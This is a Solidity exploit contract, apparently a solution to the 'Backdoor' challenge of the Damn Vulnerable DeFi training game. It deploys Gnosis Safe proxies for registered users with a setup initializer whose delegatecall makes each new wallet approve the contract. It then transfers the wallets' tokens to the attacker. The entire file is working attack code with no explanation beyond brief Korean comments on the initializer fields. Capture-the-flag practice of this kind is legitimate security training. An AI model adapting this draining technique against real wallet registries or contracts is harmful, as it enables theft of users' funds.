// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "../DamnValuableToken.sol";

interface IGnosisSafeProxyFactory{
     function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract attackBackdoor_del{
    IGnosisSafeProxyFactory public factory;
    DamnValuableToken public immutable token; 
    address public masterCopy;
    IProxyCreationCallback public WalletRegistry;
    address public attacker;
    
    constructor(address _factory,address _mastercopy,address _token,address _WalletRegistry){
        factory= IGnosisSafeProxyFactory(_factory);
        masterCopy=_mastercopy;
        token=DamnValuableToken(_token);
        WalletRegistry=IProxyCreationCallback(_WalletRegistry);
        attacker=msg.sender;
    }

    function approve(address _addr) public {
        token.approve( _addr , 10 ether);
    }

    function exploit(address[] calldata users)public{
        for(uint256 i=0;i<users.length;i++){
            address[] memory target = new address[](1);
            target[0]=users[i];

            bytes memory code = abi.encodeWithSignature("approve(address)",address(this));

            bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
            target, // owner
            uint256(1), // threshold
            address(this), // delegatecall을 위한 주소 to
            code, // delegatecall을 할 data
            address(0), // fallbackHandler 는 없어야하므로 0
            address(0), // 0은 ETH
            uint256(0), // 지불 금액
            address(0) // 지불 받을 주소
            );
            GnosisSafeProxy proxy = factory.createProxyWithCallback(masterCopy, initializer, 11, WalletRegistry);
            token.transferFrom(address(proxy),address(this),10 ether);
        }


        token.transfer(attacker,40 ether);
    }
    
}